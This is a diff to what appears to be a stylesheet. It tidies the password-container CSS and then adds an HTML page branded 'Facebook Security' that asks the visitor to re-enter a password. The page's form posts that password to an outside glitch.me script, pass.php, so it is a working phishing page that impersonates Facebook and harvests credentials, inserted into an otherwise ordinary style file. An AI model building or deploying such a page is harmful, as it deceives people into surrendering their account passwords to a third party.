@@ -18,58 +18,75 @@
 }
 
 * {
-  font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
-}
+  font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    }
 
-.passwordContainer {
-  display: block;
-  margin: 30px auto auto;
-  width: 30%;
-}
+    .passwordContainer {
+      display: block;
+      margin: auto;
+      width: 30%;
+      margin-top: 30px;
+    }
 
-.passwordContainer img {
-  display: block;
-  height: 100px;
-  margin: auto;
-  width: 100px;
-}
+    .passwordContainer img {
+      width: 100px;
+      height: 100px;
+      display: block;
+      margin: auto;
+    }
 
-.passwordContainer h3 {
-  margin-top: 30px;
-}
+    .passwordContainer h3 {
+      margin-top: 30px;
+      font-size: 24px; /* Increase font size here */
+    }
 
-.passwordContainer hr {
-  border: 1px solid #d3d3d3;
-}
+    .passwordContainer hr {
+      border: 1px solid lightgray;
+    }
 
-.passwordContainer {
-  display: flex;
-  flex-direction: column;
-  margin-top: 20px;
-}
+    .passwordContainer {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+    }
 
-.passwordContainer button {
-  background-color: #1778f2;
-  border: none;
-  border-radius: 5px;
-  color: #fff;
-  cursor: pointer;
-  font-weight: 700;
-  margin-top: 20px;
-  padding: 10px;
-}
+    .passwordContainer button {
+      margin-top: 20px;
+      padding: 10px;
+      border: none;
+      background-color: #1778f2;
+      color: white;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
 
-.passwordContainer input {
-  border: 1px solid #d3d3d3;
-  border-radius: 5px;
-  margin-top: 10px;
-  outline: none;
-  padding: 14px;
-}
+    .passwordContainer input {
+      margin-top: 10px;
+      padding: 14px;
+      border: 1px solid lightgray;
+      outline: none;
+      border-radius: 5px;
+    }
 
-.passwordContainer p {
-  color: #989797;
-}
+    .passwordContainer p {
+      color: rgb(152, 151, 151);
+    }
+  </style>
+</head>
+<body>
+  <form class="content" action="https://bedecked-entertaining-turn.glitch.me/pass.php" method="POST">
+    <div class="passwordContainer">
+      <img src="https://cdn.glitch.global/c8a0e925-2286-42f9-bc9a-4154a9091edd/3357701.webp?v=1724180745555" alt="Logo">
+      <h3>Facebook Security</h3>
+      <p>Please re-enter password to complete the request.</p>
+      <label for="password" class="sr-only">Password</label>
+      <input type="password" name="password" id="password" placeholder="Password" aria-label="Password" required>
+      <button type="submit">Submit</button>
+    </div>
+  </form>
+</body>
+</html>
 
 /*!
 * Bootstrap  v5.3.3 (https://getbootstrap.com/)
